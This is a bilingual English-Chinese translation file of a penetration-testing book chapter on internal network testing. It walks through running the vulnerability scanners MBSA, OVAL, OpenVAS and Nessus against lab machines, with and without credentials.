- en: Chapter 10. Testing Flat and Internal Networks
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 第10章。测试平面和内部网络
- en: 'In this chapter, you will learn the techniques of assessing the network when
    it is flat, that is, there is nothing between us and the target. This makes our
    task much easier; furthermore, the inside of the network is usually the place
    that has the most trusted location, and as such, it offers the least resistance,
    especially when it comes to layer two and the assignment of the physical **Media
    Access Control (MAC)** addresses. In this chapter, we will discuss the following
    topics:'
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，您将学习在网络是平面的情况下评估网络的技术，也就是说，我们和目标之间没有任何障碍。这使得我们的任务变得更容易；此外，网络内部通常是最受信任的位置，因此在涉及到二层和物理**媒体访问控制（MAC）**地址的分配时，它提供了最少的阻力。在本章中，我们将讨论以下主题：
- en: The role of Vulnerability Scanners
  id: totrans-2
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 漏洞扫描器的作用
- en: Dealing with host protection
  id: totrans-3
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 处理主机保护
- en: This chapter will provide us with details on how, when we are performing internal
    or white-box testing, we do not have the same challenges that we have when we
    are trying to conduct an external or black-box test. This does not mean that when
    the network is flat and we are inside it, we do not have challenges; there are
    a number of challenges that we may encounter. Furthermore, we have to be prepared
    for protection such as Host Based Intrusion Prevention, antivirus, host firewalls,
    and **Enhanced Mitigation Experience Toolkit** (**EMET**) that the administrator
    might have deployed.
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 本章将为我们提供有关在进行内部或白盒测试时，我们不会遇到在进行外部或黑盒测试时所遇到的挑战的详细信息。这并不意味着当网络是平面的并且我们在其中时，我们没有挑战；我们可能会遇到许多挑战。此外，我们必须做好防护的准备，例如基于主机的入侵防护、防病毒软件、主机防火墙和管理员可能部署的**增强缓解体验工具**（**EMET**）。
- en: When we are testing the network from the inside, the goal is to emulate a number
    of different threat vectors. Moreover, we want to access the network as an unauthenticated
    user, a user with normal privileges, and a user with escalated privileges; this
    works well with our tools that we use inside the network.
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们从内部测试网络时，目标是模拟多种不同的威胁向量。此外，我们希望以未经身份验证的用户、具有普通权限的用户和具有提升权限的用户的身份访问网络；这与我们在网络内部使用的工具很相配。
- en: The role of Vulnerability Scanners
  id: totrans-6
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 漏洞扫描器的作用
- en: 'So, where do Vulnerability Scanners play a part in this? Well, this is where
    they excel: when you provide the scanner with credentials, then the scanner can
    log in to the machine and check the client-side software. This is something that
    we cannot do for the most part in an external test environment.'
  id: totrans-7
  prefs: []
  type: TYPE_NORMAL
  zh: 那么，漏洞扫描器在其中扮演了什么角色呢？嗯，这就是它们擅长的地方：当您提供扫描器的凭据时，扫描器可以登录到计算机并检查客户端软件。这是我们在外部测试环境中大部分时间无法做到的事情。
- en: Before we get into the different scanners that are available within the Kali
    Linux distributions, we will look at two free tools that we can use for our vulnerability
    assessment for the internal networks.
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们介绍Kali Linux发行版中可用的不同扫描工具之前，我们将看看两个可以用于内部网络漏洞评估的免费工具。
- en: Microsoft Baseline Security Analyzer
  id: totrans-9
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Microsoft基线安全分析器
- en: 'The first tool we want to look at is from Microsoft, and it is the **Microsoft
    Baseline Security Analyzer** (**MBSA**). You can download the tool from the following
    link: [http://www.microsoft.com/en-us/download/details.aspx?id=7558](http://www.microsoft.com/en-us/download/details.aspx?id=7558)'
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 我们要看的第一个工具来自微软，它是**Microsoft基线安全分析器**（**MBSA**）。您可以从以下链接下载该工具：[http://www.microsoft.com/en-us/download/details.aspx?id=7558](http://www.microsoft.com/en-us/download/details.aspx?id=7558)
- en: One good thing about the MBSA tool is that it is from Microsoft and it has a
    pretty good idea on what is missing. It also does a good job of identifying the
    missing patches and can identify the security configuration mistakes.
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: MBSA工具的一个好处是它来自微软，并且对缺失的内容有很好的了解。它还可以很好地识别缺失的补丁并且可以识别安全配置错误。
- en: 'Once you have downloaded the tool and installed it, open it and start the program.
    An example of the opening screen configuration is shown in the following screenshot:'
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 当您下载并安装了该工具后，打开它并启动程序。以下是开屏配置的示例截图：
- en: '![Microsoft Baseline Security Analyzer](img/477-1_10_2.jpg)'
  id: totrans-13
  prefs: []
  type: TYPE_IMG
  zh: '![Microsoft基线安全分析器](img/477-1_10_2.jpg)'
- en: Screen showing the tool in the running state (the cropped text is not important)
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 显示工具运行状态的屏幕（裁剪的文本不重要）
- en: 'The first thing we want to do with a tool is scan a computer. To do this, click
    on **Scan a computer** to start the configuration process and bring up the scan
    data entry screen. As you can see, we have quite a number of ways to scan and
    a number of optional settings we can select. An example of this is shown in the
    following screenshot:'
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 我们想要用工具做的第一件事是扫描一台计算机。要做到这一点，点击**扫描计算机**来开始配置过程并打开扫描数据输入屏幕。正如您所看到的，我们有相当多的扫描方式和一些可选设置可以选择。以下是一个示例截图：
- en: '![Microsoft Baseline Security Analyzer](img/477-1_10_3.jpg)'
  id: totrans-16
  prefs: []
  type: TYPE_IMG
  zh: '![Microsoft基线安全分析器](img/477-1_10_3.jpg)'
- en: For this example, you can scan any machine you like. We are going to scan the
    localhost machine on which we are writing this book. When you have selected your
    target, click on **Start Scan** to start the scan. Consequently, you will see
    the tool connect to Microsoft and download the latest patch information. You can
    configure this to grab the information from a local server as well in case an
    Internet connection is not something you have readily available on your network.
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个例子中，您可以扫描任何您喜欢的机器。我们将扫描我们正在撰写本书的本地主机。当您选择了目标后，点击**开始扫描**来开始扫描。随后，您将看到该工具连接到微软并下载最新的补丁信息。您也可以配置它从本地服务器获取信息，以防您的网络上没有可用的互联网连接。
- en: 'An example of the completed scan is shown in the following screenshot:'
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是完成的扫描示例截图：
- en: '![Microsoft Baseline Security Analyzer](img/4771-10-04.jpg)'
  id: totrans-19
  prefs: []
  type: TYPE_IMG
  zh: '![Microsoft基线安全分析器](img/4771-10-04.jpg)'
- en: 'As the previous screenshot shows, we do have some concerns on this machine
    that we scanned. A nice feature of the tool is that we can click on **How to correct
    this link** and get additional information on the finding. An example of the additional
    information can be found in the following screenshot:'
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 正如前面的截图所示，我们对我们扫描的这台机器有一些担忧。该工具的一个很好的特性是，我们可以点击**如何纠正此链接**，并获取有关发现的额外信息。额外信息的示例可以在以下截图中找到：
- en: '![Microsoft Baseline Security Analyzer](img/477-1_10_5.jpg)'
  id: totrans-21
  prefs: []
  type: TYPE_IMG
  zh: '![Microsoft基线安全分析器](img/477-1_10_5.jpg)'
- en: The MBSA tool is a good representation of what Vulnerability Scanners excel
    at. This is to be used by the owners of the network as it helps them with their
    vulnerability management program. With internal testing, we can also use Vulnerability
    Scanners to show the client whether their patch-management strategy is working.
    The next tool we want to look at comes from the group at **Mitre**, and it is
    the **Open Vulnerability Assessment Language** (**OVAL**) tool.
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: MBSA工具很好地展示了漏洞扫描器的优点。这是由网络所有者使用的，因为它帮助他们进行漏洞管理程序。通过内部测试，我们还可以使用漏洞扫描器向客户展示他们的补丁管理策略是否有效。我们接下来要看的工具来自**Mitre**团队，它是**开放漏洞评估语言**（**OVAL**）工具。
- en: Open Vulnerability Assessment Language
  id: totrans-23
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 开放漏洞评估语言
- en: 'The OVAL tool differs from the MBSA tool because it looks not only at the Microsoft
    software but also at others. The one thing that is important to note is that this
    tool is not an enterprise type of tool, but for our internal testing purposes,
    we can use it to provide us with a look at the software that is installed on the
    machine and see whether there are any vulnerabilities there. A description of
    OVAL from their website is shown in the following screenshot:'
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: OVAL工具与MBSA工具不同，因为它不仅查看微软软件，还查看其他软件。重要的一点是，这个工具不是企业类型的工具，但是对于我们的内部测试目的，我们可以使用它来查看安装在机器上的软件，并查看是否存在任何漏洞。以下是来自其网站的OVAL描述截图：
- en: '![Open Vulnerability Assessment Language](img/477-1_10_6.jpg)'
  id: totrans-25
  prefs: []
  type: TYPE_IMG
  zh: '![开放漏洞评估语言](img/477-1_10_6.jpg)'
- en: As the previous screenshot shows, this tool is international and provides a
    method to evaluate the state of computer systems. We will take a look at the tool.
    To do this, we will look at the OVAL Interpreter, which provides a method of demonstrating
    the tool and its definitions; you can download it from [http://sourceforge.net/projects/ovaldi/](http://sourceforge.net/projects/ovaldi/).
    Once the tool downloads, run the tool and install it. For the purpose of the book,
    we are installing it on a virtual machine that has Windows 7 running on it. Feel
    free to install it on the machine of your choice. Once you have downloaded the
    tool, when you run the executable file, which is an SFX archive, and upon execution
    all the files will be unzipped to a directory on the hard drive. By default, it
    will select the `Program Files` directory; however, it is recommended that you
    change the location to the one that does not have spaces in the directory's name.
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 正如前面的截图所示，这个工具是国际化的，并提供了一种评估计算机系统状态的方法。我们将看一下这个工具。为此，我们将看一下OVAL解释器，它提供了一种演示工具及其定义的方法；您可以从[http://sourceforge.net/projects/ovaldi/](http://sourceforge.net/projects/ovaldi/)下载它。工具下载完成后，运行工具并安装它。为了本书的目的，我们将其安装在运行Windows
    7的虚拟机上。请随意在您选择的机器上安装它。下载了工具之后，当您运行可执行文件时，它是一个SFX存档，执行后所有文件将解压缩到硬盘上的一个目录中。默认情况下，它将选择`Program
    Files`目录；但是，建议您将位置更改为目录名称中没有空格的位置。
- en: 'Once you have unzipped the files, you can read the `README.txt` file and you
    will discover that the next thing you have to do is to download the latest definitions
    file. An example of information on these definitions files that includes their
    types is shown in the following screenshot:'
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 解压缩文件后，您可以阅读`README.txt`文件，您会发现接下来要做的事情是下载最新的定义文件。以下截图显示了有关这些定义文件的信息，包括它们的类型：
- en: '![Open Vulnerability Assessment Language](img/477-1_10_7.jpg)'
  id: totrans-28
  prefs: []
  type: TYPE_IMG
  zh: '![开放漏洞评估语言](img/477-1_10_7.jpg)'
- en: Once you have reviewed the information on the definitions, we would want to
    use the vulnerability definitions. You can download their latest version from
    [http://oval.mitre.org/rep-data/index.html](http://oval.mitre.org/rep-data/index.html).
    At the time of writing this book, the latest version of OVAL is 5.10, which is
    the version we will be working with. Your version may be different, and as such,
    some of the screenshots might vary from those in the book.
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 查看了定义的信息后，我们会想要使用漏洞定义。您可以从[http://oval.mitre.org/rep-data/index.html](http://oval.mitre.org/rep-data/index.html)下载它们的最新版本。在撰写本书时，OVAL的最新版本是5.10，这是我们将要使用的版本。您的版本可能不同，因此一些截图可能与本书中的截图不同。
- en: You will notice that the definitions are by platform; this makes it easier for
    us to only concentrate on the specific platform we are using when we run the interpreter.
    As we are using Windows 7 for the book, we will only download that. You also see
    that there is a hash value to help maintain the integrity of the definitions.
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: 您会注意到定义是按平台划分的；这样我们在运行解释器时只需专注于我们正在使用的特定平台。由于我们在本书中使用的是Windows 7，我们只会下载它。您还会看到有一个哈希值来帮助维护定义的完整性。
- en: Tip
  id: totrans-31
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 提示
- en: Once you have downloaded the definitions, you would want to place it in the
    OVAL directory and rename it to `definitions.xml`.
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 下载了定义之后，您会想把它放在OVAL目录中，并将其重命名为`definitions.xml`。
- en: 'Once you have renamed the file, you are ready to run the interpreter tool;
    enter the following in a command prompt window:'
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: 重命名文件后，您就可以运行解释器工具了；在命令提示符窗口中输入以下内容：
- en: '[PRE0]'
  id: totrans-34
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: If you get an application initialization error, then you have to download the
    correct Visual C++ platform for your version of OS and possibly, the .NET 4.0
    package. This is one of the downfalls of using Windows, especially when it comes
    to the open source tools. Of course, you can run into the same problems with UNIX
    and Linux with library dependencies and other challenges. Refer to the `README`
    file for more information. The command uses the hash as a validation that the
    definitions file is not corrupt.
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: 如果出现应用程序初始化错误，则必须下载适用于您的操作系统版本的正确Visual C++平台，可能还需要.NET 4.0包。这是使用Windows的一个缺点，特别是在使用开源工具时。当然，您也可能在UNIX和Linux中遇到相同的问题，例如库依赖性和其他挑战。有关更多信息，请参阅`README`文件。该命令使用哈希作为验证，以确保定义文件没有损坏。
- en: 'An example of the initial results when the command is run is shown in the following
    screenshot:'
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 运行命令时的初始结果示例如下截图所示：
- en: '![Open Vulnerability Assessment Language](img/477-1_10_8.jpg)'
  id: totrans-37
  prefs: []
  type: TYPE_IMG
  zh: '![Open Vulnerability Assessment Language](img/477-1_10_8.jpg)'
- en: 'Once the characteristics file is created, you will see the tool report stating
    that it is running the OVAL definition analysis on the date that was collected.
    This process will take some time to complete and is dependent on the amount of
    software and other things on the machine it is run on. An example of when the
    tool gets to this stage is shown in the following screenshot:'
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 创建特征文件后，您将看到工具报告，指出它正在运行OVAL定义分析，并显示收集的日期。这个过程需要一些时间来完成，取决于运行的机器上的软件数量和其他因素。当工具到达这个阶段时的示例如下截图所示：
- en: '![Open Vulnerability Assessment Language](img/477-1_10_9.jpg)'
  id: totrans-39
  prefs: []
  type: TYPE_IMG
  zh: '![Open Vulnerability Assessment Language](img/477-1_10_9.jpg)'
- en: 'When the analysis is completed, the output will be written to the file that
    was specified on the command line. In our example here, we are writing the output
    to the `test.html` file. An example of the information on the system is shown
    in the following screenshot:'
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 分析完成后，输出将被写入命令行上指定的文件。在我们的示例中，我们将输出写入`test.html`文件。以下截图显示了系统信息的示例：
- en: '![Open Vulnerability Assessment Language](img/477-1_10_10.jpg)'
  id: totrans-41
  prefs: []
  type: TYPE_IMG
  zh: '![Open Vulnerability Assessment Language](img/477-1_10_10.jpg)'
- en: 'The previous screenshot shows us not only the information about the machine,
    but also the OVAL tool itself. It provides us with the schema version and the
    product version as well. Below this area is the report on the findings of the
    tool. This is where the vulnerabilities will be listed, including the references
    to external information to learn more about the finding. An example of this is
    shown in the following screenshot:'
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 上一张屏幕截图不仅显示了有关机器的信息，还显示了OVAL工具本身。它为我们提供了模式版本和产品版本。在此区域下方是工具发现的报告。这是漏洞的列表，包括对外部信息的引用，以了解更多关于发现的信息。以下截图显示了一个示例：
- en: '![Open Vulnerability Assessment Language](img/477-1_10_11.jpg)'
  id: totrans-43
  prefs: []
  type: TYPE_IMG
  zh: '![Open Vulnerability Assessment Language](img/477-1_10_11.jpg)'
- en: Screen showing the vulnerabilities listed, including the references to external
    information (the cropped text is not important)
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 显示了列出的漏洞，包括对外部信息的引用（裁剪的文本不重要）
- en: 'As you can see in the previous screenshot, there is a reference to both the
    OVAL ID and the **Common Vulnerability** and **Exposure** (**CVE**) number. To
    gather more information, you can click on the link provided. An example of the
    information at the OVAL ID site is shown in the following screenshot:'
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 如前面的截图所示，这里引用了OVAL ID和**通用漏洞**和**暴露**（**CVE**）编号。要获取更多信息，可以单击提供的链接。以下截图显示了OVAL
    ID网站上的信息示例：
- en: '![Open Vulnerability Assessment Language](img/477-1_10_12.jpg)'
  id: totrans-46
  prefs: []
  type: TYPE_IMG
  zh: '![Open Vulnerability Assessment Language](img/477-1_10_12.jpg)'
- en: The OVAL tool is the one you might want to become more familiar with. When you
    are doing internal testing, it can be a valuable asset to help you find vulnerabilities
    that a vulnerability scanner might not find. We will now look at the vulnerability
    scanners that are normally used from a remote location with respect to the target.
    We had this with the MBSA tool as well, but it required privileged access to perform
    the scan. Additionally, the OVAL tool also required privileged access.
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: OVAL工具是您可能想要更熟悉的工具。在进行内部测试时，它可以帮助您发现漏洞，而漏洞扫描器可能无法找到。我们现在将看一下通常从远程位置使用的漏洞扫描器。我们在MBSA工具中也有这个功能，但它需要特权访问来执行扫描。此外，OVAL工具也需要特权访问。
- en: Scanning without credentials
  id: totrans-48
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 无凭证扫描
- en: 'When we use a vulnerability scanner in our internal testing, the first scan
    will be without credentials, so we will look at the tools within Kali Linux to
    achieve this. The Vulnerability Scanners in Kali Linux are found by navigating
    to **Applications** | **Kali Linux** | **Vulnerability Analysis** location. Within
    this location, there are a number of tools we can use for our vulnerability scanning.
    An example is shown in the following screenshot:'
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们的内部测试中使用漏洞扫描器时，第一次扫描将不使用凭证，因此我们将查看Kali Linux中的工具来实现这一点。在Kali Linux中，漏洞扫描器位于**应用程序**
    | **Kali Linux** | **漏洞分析**位置。在这个位置中，有许多工具可供我们用于漏洞扫描。以下截图显示了一个示例：
- en: '![Scanning without credentials](img/477-1_10_13.jpg)'
  id: totrans-50
  prefs: []
  type: TYPE_IMG
  zh: '![Scanning without credentials](img/477-1_10_13.jpg)'
- en: The scanner we will work with is the OpenVAS scanner. When you start working
    with OpenVAS for the first time, there are a number of steps required. The first
    step is to navigate to **Applications** | **Kali Linux** | **Vulnerability Analysis**
    | **OpenVAS** | **Initial Setup**. This will download all the plugins required
    and will take some time to complete. Once the tool is loaded, you will be asked
    for a password; the default user is `admin`, and you can enter a password of your
    choice.
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将使用的扫描器是OpenVAS扫描器。当您第一次开始使用OpenVAS时，需要执行一些步骤。第一步是导航到**应用程序** | **Kali Linux**
    | **漏洞分析** | **OpenVAS** | **初始设置**。这将下载所需的所有插件，并需要一些时间来完成。工具加载完成后，将要求输入密码；默认用户是`admin`，您可以输入自己选择的密码。
- en: 'The next thing you need to do is open a browser and connect to the interface
    of the tool. In the browser, enter `https://127.0.0.1:9392` to open OpenVAS. An
    example is shown in the following screenshot:'
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: 您需要做的下一件事是打开浏览器并连接到该工具的界面。在浏览器中输入`https://127.0.0.1:9392`以打开OpenVAS。下面的截图显示了一个示例：
- en: '![Scanning without credentials](img/477-1_10_14.jpg)'
  id: totrans-53
  prefs: []
  type: TYPE_IMG
  zh: '![无凭证扫描](img/477-1_10_14.jpg)'
- en: The screen you get after entering https://127.0.0.1:9392 in the browser (the
    cropped text is not important)
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: 在浏览器中输入https://127.0.0.1:9392后显示的界面（裁剪的文本不重要）
- en: 'Log in to the interface with the username as `admin` and the password you created
    during the initial setup. This will bring you to the scan configuration page,
    which in Kali, includes a `Quick start` area, as shown in the following screenshot:'
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: 使用用户名`admin`和您在初始设置期间创建的密码登录界面。这将带您进入扫描配置页面，在Kali中，包括一个`快速入门`区域，如下截图所示：
- en: '![Scanning without credentials](img/477-1_10_15.jpg)'
  id: totrans-56
  prefs: []
  type: TYPE_IMG
  zh: '![无凭证扫描](img/477-1_10_15.jpg)'
- en: Prior to scanning, we have some additional steps to perform. The first step
    is to update the **Network Vulnerability Tests** (**NVT**) feed. Navigate to **Administration**
    | **NVT Feed** | **Synchronize feed now**; once the synchronization finishes,
    you need to update the **Security Content Automation Protocol** (**SCAP**) feed.
    We can do this by navigating to **Administration** | **SCAP Feed** | **Synchronize
    with SCAP** and then updating the CERT feed by navigating to **Administration**
    | **NVT Feed** | **Synchronize CERT feed now**.
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: 在进行扫描之前，我们还有一些额外的步骤要执行。第一步是更新**网络漏洞测试**（**NVT**）源。导航到**管理** | **NVT源** | **立即同步源**；一旦同步完成，您需要更新**安全内容自动化协议**（**SCAP**）源。我们可以通过导航到**管理**
    | **SCAP源** | **与SCAP同步**，然后通过导航到**管理** | **NVT源** | **立即同步CERT源**来完成这一步。
- en: For our first scan, we will scan the Windows XP machine as it should provide
    us with a number of findings. As you see in the explanation in the **Quick start**
    section, the shortcut saves us the trouble of creating the target and a new task
    for the scan. For some of you reading this, you might have run OpenVAS on the
    **BackTrack** distribution and will remember how cumbersome it could be doing
    a scan there.
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
  zh: 对于我们的第一次扫描，我们将扫描Windows XP机器，因为它应该为我们提供许多发现。正如您在**快速入门**部分的解释中所看到的，快捷方式可以帮我们省去创建目标和扫描的新任务的麻烦。对于阅读本书的一些人来说，您可能已经在**BackTrack**发行版上运行过OpenVAS，并且还记得在那里进行扫描可能有多麻烦。
- en: Note
  id: totrans-59
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: If you have problems with the OpenVAS, it is sometimes easier to just perform
    the process in BackTrack. For some reason, when you update the Kali Linux distribution,
    there are times when it breaks OpenVAS. There are some very good tutorials on
    the Internet to use the tool. A favorite one for using it on BackTrack can be
    found at [http://www.ehacking.net/2011/06/backtrack-5-openvas-tutorial.html](http://www.ehacking.net/2011/06/backtrack-5-openvas-tutorial.html).
    Even though it is a bit outdated, it works very well.
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您在OpenVAS上遇到问题，有时在BackTrack中执行该过程会更容易。由于某种原因，当您更新Kali Linux发行版时，有时会导致OpenVAS出现问题。有一些非常好的互联网教程可以使用该工具。在BackTrack上使用它的一个很受欢迎的教程可以在[http://www.ehacking.net/2011/06/backtrack-5-openvas-tutorial.html](http://www.ehacking.net/2011/06/backtrack-5-openvas-tutorial.html)找到。尽管它有点过时，但它运行得非常好。
- en: 'Once we have scanned the XP machine, we are presented with a report of the
    findings. An example of the report for the XP machine is shown in the following
    screenshot:'
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦我们扫描了XP机器，我们将得到一份发现报告。XP机器的报告示例如下截图所示：
- en: '![Scanning without credentials](img/477-1_10_16.jpg)'
  id: totrans-62
  prefs: []
  type: TYPE_IMG
  zh: '![无凭证扫描](img/477-1_10_16.jpg)'
- en: Nessus
  id: totrans-63
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Nessus
- en: The next tool we will use is Vulnerability Scanner **Nessus** from Tenable.
    You can download the tool from [http://www.tenable.com/products/nessus/select-your-operating-system](http://www.tenable.com/products/nessus/select-your-operating-system).
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将使用的下一个工具是Tenable的漏洞扫描工具**Nessus**。您可以从[http://www.tenable.com/products/nessus/select-your-operating-system](http://www.tenable.com/products/nessus/select-your-operating-system)下载该工具。
- en: Once you have downloaded the tool, you need to register for a home registration
    feed and then install the software. In this book, we are going to use the Windows
    version of the tool. This is because the web interface uses flash, and this can
    sometimes cause problems in the Kali Linux distribution, so it is often easier
    to use the Windows tool. You are welcome to use the one in Kali; just search on
    the Internet for a tutorial and it will walk you through the process.
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦您下载了该工具，您需要注册一个家庭注册源，然后安装软件。在本书中，我们将使用该工具的Windows版本。这是因为Web界面使用Flash，这有时会在Kali
    Linux发行版中引起问题，因此通常更容易使用Windows工具。欢迎您在Kali中使用该工具；只需在互联网上搜索教程，它将指导您完成整个过程。
- en: 'At the time of writing of this book, the latest version of Nessus is 5.2.5,
    and this revision includes a number of features and a redesigned interface for
    Nessus. Additionally, they have added the capability of creating remediation reports.
    This is always a nice feature when you are testing, because then you can help
    the client understand what it will take to fix the findings that you discovered.
    With this version, it is required that you first select a policy before you perform
    a scan. An example of the policy options is shown in the following screenshot:'
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: 在撰写本书时，Nessus的最新版本是5.2.5，此版本包括许多功能和重新设计的Nessus界面。此外，他们还增加了创建修复报告的功能。当您进行测试时，这总是一个很好的功能，因为然后您可以帮助客户了解修复您发现的问题需要付出什么样的努力。在此版本中，您需要在执行扫描之前首先选择一个策略。策略选项的示例如下截图所示：
- en: '![Nessus](img/477-1_10_17.jpg)'
  id: totrans-67
  prefs: []
  type: TYPE_IMG
  zh: '![Nessus](img/477-1_10_17.jpg)'
- en: 'For our policy in our example, we will click on **Basic Network Scan** and
    open the configuration form for the policy. We will scan our Windows 7 machine,
    but first, we need to enter a name for the scan. We will enter the name as `FirstScan`.
    You will also notice that you can select a scope. We will leave the default setting
    of private and click on **Next** to move on to the next screen. We have the choice
    of selecting **Internal** or **External** as the scan type. As we are on a flat
    network, we will use the setting of **Internal** and click on **Next**. This will
    bring us to a screen where we can add credentials. As this is a scan without credentials,
    we will not do it now. So, click on **Save** to save the details of the scan.
    An example of our first scan policy is shown in the following screenshot:'
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们的示例中，我们将点击**基本网络扫描**并打开策略的配置表单。我们将扫描我们的Windows 7机器，但首先，我们需要为扫描输入一个名称。我们将输入名称为`FirstScan`。您还会注意到您可以选择一个范围。我们将保留私有的默认设置，并点击**下一步**进入下一个屏幕。我们可以选择**内部**或**外部**作为扫描类型。由于我们在一个平面网络上，我们将使用**内部**的设置，并点击**下一步**。这将带我们到一个屏幕，我们可以添加凭据。由于这是一个没有凭据的扫描，我们现在不会这样做。所以，点击**保存**保存扫描的详细信息。我们第一次扫描策略的示例如下截图所示：
- en: '![Nessus](img/477-1_10_18.jpg)'
  id: totrans-69
  prefs: []
  type: TYPE_IMG
  zh: '![Nessus](img/477-1_10_18.jpg)'
- en: 'We are now ready to start our scan, so navigate to **Scans** | **New Scan**
    to start the configuration process for the scan. Enter a name for the scan and
    then enter the IP address of the target. An example of the scan''s configuration
    is shown in the following screenshot:'
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们准备开始扫描，所以导航到**扫描** | **新扫描**开始扫描的配置过程。输入扫描的名称，然后输入目标的IP地址。扫描配置的示例如下截图所示：
- en: '![Nessus](img/477-1_10_19.jpg)'
  id: totrans-71
  prefs: []
  type: TYPE_IMG
  zh: '![Nessus](img/477-1_10_19.jpg)'
- en: 'Once you have verified your information, click on the **Launch** button to
    launch the scan. You will notice that the scan starts, and you should see a **Running**
    message to indicate the scan is in the running state. It will take some time,
    but when the scan completes, you will see it indicated in the status area as **Completed**.
    An example of the scan results is shown in the following screenshot:'
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦您验证了您的信息，点击**启动**按钮启动扫描。您会注意到扫描开始了，并且您应该看到一个**运行中**的消息来指示扫描处于运行状态。这将需要一些时间，但当扫描完成时，您将在状态区域看到它标记为**已完成**。扫描结果的示例如下截图所示：
- en: '![Nessus](img/477-1_10_20.jpg)'
  id: totrans-73
  prefs: []
  type: TYPE_IMG
  zh: '![Nessus](img/477-1_10_20.jpg)'
- en: 'Well, this is not very exciting; we have all blue and only three total vulnerabilities.
    So, we need to scan something that will provide us some more weaknesses. We will
    do this now; the next scan will be that of the Windows XP machine. An example
    of the results of this scan is shown in the following screenshot:'
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: 嗯，这并不是很令人兴奋；我们只有蓝色和三个漏洞。所以，我们需要扫描一些能够提供更多弱点的东西。我们现在就来做这个；下一个扫描将是Windows XP机器的扫描。这次扫描的结果示例如下截图所示：
- en: '![Nessus](img/477-1_10_21.jpg)'
  id: totrans-75
  prefs: []
  type: TYPE_IMG
  zh: '![Nessus](img/477-1_10_21.jpg)'
- en: Well, this is a little better, but not much!
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 嗯，这好一点，但还不够好！
- en: Scanning with credentials
  id: totrans-77
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用凭据进行扫描
- en: Again, as we have specified, Vulnerability Scanners work best when they are
    provided with credentials. Up to this point, we have not provided any credentials.
    We will do this now. If you return to your scan policy's configuration by navigating
    to **Policies** | **New Policy**, click on **Basic Network Scan** and then on
    **Next**. When you get to the configuration of the credentials page, you need
    to enter an administrator account's username and password. There is also a credentialed
    scan option, but for now, we will conduct the same scan we just did and see what
    happens. Once we have entered the required details, click on **Launch** to launch
    the scan.
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 再次强调，当提供凭据时，漏洞扫描器的工作效果最佳。到目前为止，我们还没有提供任何凭据。我们现在将这样做。如果您返回到扫描策略的配置，导航到**策略**
    | **新策略**，点击**基本网络扫描**，然后点击**下一步**。当您到达凭据页面的配置时，您需要输入管理员帐户的用户名和密码。还有一个有凭据的扫描选项，但现在我们将进行与刚才相同的扫描，看看会发生什么。一旦我们输入了所需的详细信息，点击**启动**启动扫描。
- en: 'An example of the completed scan is shown in the following screenshot:'
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: 已完成扫描的示例如下截图所示：
